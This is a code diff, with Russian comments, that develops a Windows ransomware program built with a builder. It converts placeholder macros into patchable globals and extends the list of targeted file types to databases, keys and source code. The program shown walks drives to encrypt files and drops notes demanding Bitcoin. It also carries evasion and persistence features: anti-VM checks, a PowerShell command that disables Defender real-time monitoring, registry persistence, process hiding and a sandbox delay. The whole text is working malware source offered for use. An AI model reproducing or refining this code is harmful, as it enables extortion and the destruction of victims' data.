@@ -18,26 +18,26 @@
 #pragma comment(lib, "crypt32.lib")
 
 // ============================================================
-// ЗАГЛУШКИ — БУДУТ ЗАМЕНЕНЫ БИЛДЕРОМ
+// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ ПАТЧИНГА (С ФИКСИРОВАННЫМИ РАЗМЕРАМИ)
 // ============================================================
-#define ALGO_PLACEHOLDER 0
-#define DRIVES_PLACEHOLDER "C:\\|D:\\"
-#define FOLDERS_INCLUDE_PLACEHOLDER ""
-#define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
-#define EXTS_PLACEHOLDER ".txt|.doc|.docx"
-#define ENCRYPTED_EXT_PLACEHOLDER ".enc"
-#define WALLPAPER_BASE64_PLACEHOLDER ""
-#define WALLPAPER_EXT_PLACEHOLDER ".jpg"
-#define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
-#define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
-#define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
-#define FAKE_PROCESS_ENABLED_PLACEHOLDER 0
-#define HIDE_PROCESS_ENABLED_PLACEHOLDER 0
-#define ANTI_VM_ENABLED_PLACEHOLDER 0
-#define DISABLE_DEFENDER_ENABLED_PLACEHOLDER 0
-#define ADD_PERSISTENCE_ENABLED_PLACEHOLDER 0
-#define HIDE_FILES_ENABLED_PLACEHOLDER 0
-#define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
+char g_Drives[256] = "C:\\|D:\\";
+char g_Exts[1024] = ".txt|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.pdf|.jpg|.jpeg|.png|.gif|.bmp|.zip|.rar|.7z|.tar|.gz|.db|.sql|.sqlite|.pem|.key|.crt|.pfx|.p12|.cs|.cpp|.c|.h|.java|.class|.py|.js|.html|.css|.php|.asp|.xml|.json|.log|.bak|.old|.tmp";
+char g_Exclude[1024] = "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)|C:\\ProgramData|C:\\System Volume Information|$Recycle.Bin";
+char g_EncryptedExt[16] = ".enc";
+char g_WallpaperBase64[16384] = "";
+char g_WallpaperExt[8] = ".jpg";
+char g_NoteName[64] = "READ_ME.txt";
+char g_NoteContent[4096] = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
+char g_FakeName[64] = "svchost.exe";
+char g_IncludeFolders[1024] = "";
+unsigned char g_FakeEnabled = 0;
+unsigned char g_HideEnabled = 0;
+unsigned char g_AntiVM = 0;
+unsigned char g_DisableDefender = 0;
+unsigned char g_Persistence = 0;
+unsigned char g_HideFiles = 0;
+unsigned char g_SandboxDelay = 0;
+unsigned char g_Algo = 0; // 0=AES, 1=Salsa20, 2=RSA
 
 // ============================================================
 // AES-256-CBC (Windows CryptoAPI)
@@ -55,6 +55,7 @@ public:
             return;
         }
         
+        srand(GetTickCount() ^ GetCurrentProcessId());
         for (int i = 0; i < 32; i++) key[i] = rand() % 256;
         for (int i = 0; i < 16; i++) iv[i] = rand() % 256;
         
@@ -104,7 +105,7 @@ public:
 };
 
 // ============================================================
-// SALSA20
+// SALSA20 (упрощенная версия для демонстрации)
 // ============================================================
 class Salsa20 {
 private:
@@ -113,6 +114,7 @@ private:
     
 public:
     Salsa20() {
+        srand(GetTickCount() ^ GetCurrentProcessId());
         for (int i = 0; i < 32; i++) key[i] = rand() % 256;
         for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
     }
@@ -128,7 +130,7 @@ public:
 };
 
 // ============================================================
-// RSA
+// RSA (упрощенная версия)
 // ============================================================
 class RSA_Encrypt {
 private:
@@ -180,8 +182,12 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
     return result;
 }
 
+void to_lowercase(std::string& str) {
+    std::transform(str.begin(), str.end(), str.begin(), ::tolower);
+}
+
 // ============================================================
-// УСТАНОВКА ОБОЕВ ИЗ BASE64 (100% РАБОТАЕТ)
+// УСТАНОВКА ОБОЕВ ИЗ BASE64
 // ============================================================
 void set_wallpaper(const std::string& base64_data, const std::string& ext) {
     if (base64_data.empty()) return;
@@ -208,6 +214,9 @@ void set_wallpaper(const std::string& base64_data, const std::string& ext) {
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 }
 
+// ============================================================
+// ПЕРСИСТЕНТНОСТЬ
+// ============================================================
 void add_persistence() {
     char exe_path[MAX_PATH];
     GetModuleFileNameA(NULL, exe_path, MAX_PATH);
@@ -219,6 +228,9 @@ void add_persistence() {
     }
 }
 
+// ============================================================
+// СКРЫТИЕ ФАЙЛОВ
+// ============================================================
 void hide_files(const std::string& ext) {
     char drives[256];
     GetLogicalDriveStringsA(256, drives);
@@ -238,6 +250,9 @@ void hide_files(const std::string& ext) {
     }
 }
 
+// ============================================================
+// ОБНАРУЖЕНИЕ VM
+// ============================================================
 bool detect_vm() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap != INVALID_HANDLE_VALUE) {
@@ -246,7 +261,7 @@ bool detect_vm() {
         if (Process32First(snap, &pe)) {
             do {
                 std::string name = pe.szExeFile;
-                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
+                to_lowercase(name);
                 if (name.find("vbox") != std::string::npos ||
                     name.find("vmware") != std::string::npos ||
                     name.find("virtual") != std::string::npos ||
@@ -261,14 +276,23 @@ bool detect_vm() {
     return false;
 }
 
+// ============================================================
+// ОТКЛЮЧЕНИЕ DEFENDER
+// ============================================================
 void disable_defender() {
     system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
 }
 
+// ============================================================
+// МАСКИРОВКА ПРОЦЕССА
+// ============================================================
 void fake_process_name() {
-    SetConsoleTitleA(FAKE_PROCESS_NAME_PLACEHOLDER);
+    SetConsoleTitleA(g_FakeName);
 }
 
+// ============================================================
+// СКРЫТИЕ ПРОЦЕССА
+// ============================================================
 void hide_process() {
     try {
         SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
@@ -276,7 +300,7 @@ void hide_process() {
 }
 
 // ============================================================
-// ШИФРОВАНИЕ ФАЙЛОВ
+// ШИФРОВАНИЕ ФАЙЛА
 // ============================================================
 void encrypt_file(const std::string& path, const std::string& ext, int algo) {
     try {
@@ -323,7 +347,7 @@ void encrypt_file(const std::string& path, const std::string& ext, int algo) {
 }
 
 // ============================================================
-// ОБХОД ПАПОК (РЕКУРСИВНЫЙ)
+// ОБХОД И ШИФРОВАНИЕ
 // ============================================================
 void walk_and_encrypt(const std::string& start_path,
                       const std::vector<std::string>& extensions,
@@ -345,7 +369,7 @@ void walk_and_encrypt(const std::string& start_path,
             if (excluded) continue;
             
             std::string ext = entry.path().extension().string();
-            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+            to_lowercase(ext);
             if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                 encrypt_file(full_path, encrypted_ext, algo);
             }
@@ -354,7 +378,7 @@ void walk_and_encrypt(const std::string& start_path,
 }
 
 // ============================================================
-// ФАЙЛЫ ВЫКУПА
+// РАЗМЕЩЕНИЕ ЗАПИСОК
 // ============================================================
 void drop_notes(const std::vector<std::string>& drives,
                 const std::vector<std::string>& exclude_folders,
@@ -392,40 +416,59 @@ void drop_notes(const std::vector<std::string>& drives,
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     srand(GetTickCount() ^ GetCurrentProcessId());
     
-    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) return 0;
-    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) fake_process_name();
-    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) hide_process();
-    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) disable_defender();
-    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) add_persistence();
-    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) Sleep(60000);
+    // Anti-VM
+    if (g_AntiVM && detect_vm()) return 0;
     
-    std::string drives_str = DRIVES_PLACEHOLDER;
-    std::string exts_str = EXTS_PLACEHOLDER;
-    std::string exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
-    std::string encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
+    // Маскировка
+    if (g_FakeEnabled) fake_process_name();
+    if (g_HideEnabled) hide_process();
+    
+    // Отключение Defender
+    if (g_DisableDefender) disable_defender();
+    
+    // Персистентность
+    if (g_Persistence) add_persistence();
+    
+    // Задержка для обхода песочниц
+    if (g_SandboxDelay) Sleep(60000);
+    
+    // Парсинг настроек
+    std::string drives_str = g_Drives;
+    std::string exts_str = g_Exts;
+    std::string exclude_str = g_Exclude;
+    std::string include_str = g_IncludeFolders;
+    std::string encrypted_ext = g_EncryptedExt;
     
     auto drives = split_string(drives_str, '|');
     auto extensions = split_string(exts_str, '|');
     auto exclude_folders = split_string(exclude_str, '|');
-    int algo = ALGO_PLACEHOLDER;
+    auto include_folders = split_string(include_str, '|');
+    int algo = g_Algo;
     
+    // Если указаны конкретные папки для шифрования
+    std::vector<std::string> targets = drives;
+    if (!include_folders.empty() && !(include_folders.size() == 1 && include_folders[0].empty())) {
+        targets = include_folders;
+    }
+    
+    // Запуск шифрования в потоках
     std::vector<std::thread> threads;
-    for (const auto& drive : drives) {
-        threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
+    for (const auto& target : targets) {
+        threads.emplace_back(walk_and_encrypt, target, std::ref(extensions),
                            std::ref(exclude_folders), std::ref(encrypted_ext), algo);
     }
     for (auto& t : threads) t.join();
     
-    if (HIDE_FILES_ENABLED_PLACEHOLDER) hide_files(encrypted_ext);
+    // Скрытие зашифрованных файлов
+    if (g_HideFiles) hide_files(encrypted_ext);
     
-    std::string note_name = NOTE_NAME_PLACEHOLDER;
-    std::string note_content = NOTE_CONTENT_PLACEHOLDER;
+    // Размещение записок
+    std::string note_name = g_NoteName;
+    std::string note_content = g_NoteContent;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    // ============================================================
-    // УСТАНАВЛИВАЕМ ОБОИ ИЗ BASE64
-    // ============================================================
-    set_wallpaper(WALLPAPER_BASE64_PLACEHOLDER, WALLPAPER_EXT_PLACEHOLDER);
+    // Установка обоев
+    set_wallpaper(g_WallpaperBase64, g_WallpaperExt);
     
     return 0;
 }
